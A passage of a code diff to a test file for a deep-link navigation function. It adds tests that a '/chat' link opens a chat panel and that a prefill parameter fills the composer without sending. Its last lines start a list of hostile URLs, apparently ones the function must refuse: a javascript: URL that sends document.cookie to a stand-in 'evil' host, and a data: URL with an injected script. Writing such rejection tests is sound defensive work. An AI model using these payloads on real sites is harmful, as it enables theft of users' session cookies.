@@ -69,6 +69,34 @@ describe("navigateDeepLink", () => {
     expect(openSpy).not.toHaveBeenCalled();
   });
 
+  it("opens the floating chat for /chat instead of a routed navigation", () => {
+    navigateDeepLink("/chat");
+    const types = dispatchSpy.mock.calls
+      .map((c: unknown[]) => c[0])
+      .filter((e: unknown): e is CustomEvent => e instanceof CustomEvent)
+      .map((e: CustomEvent) => e.type);
+    expect(types).toContain("eliza:chat:open");
+    expect(types).not.toContain("eliza:navigate:view");
+  });
+
+  it("prefills the chat composer for /chat?prefill=<text> (never auto-sends)", () => {
+    navigateDeepLink("/chat?prefill=Connect%20my%20calendar");
+    const evt = dispatchSpy.mock.calls
+      .map((c: unknown[]) => c[0])
+      .find(
+        (e: unknown): e is CustomEvent =>
+          e instanceof CustomEvent && e.type === "eliza:chat:prefill",
+      );
+    expect((evt?.detail as { text?: string }).text).toBe(
+      "Connect my calendar",
+    );
+    const types = dispatchSpy.mock.calls
+      .map((c: unknown[]) => c[0])
+      .filter((e: unknown): e is CustomEvent => e instanceof CustomEvent)
+      .map((e: CustomEvent) => e.type);
+    expect(types).not.toContain("eliza:navigate:view");
+  });
+
   it.each([
     "javascript:fetch('//evil/'+document.cookie)",
     "data:text/html,<script>alert(1)</script>",
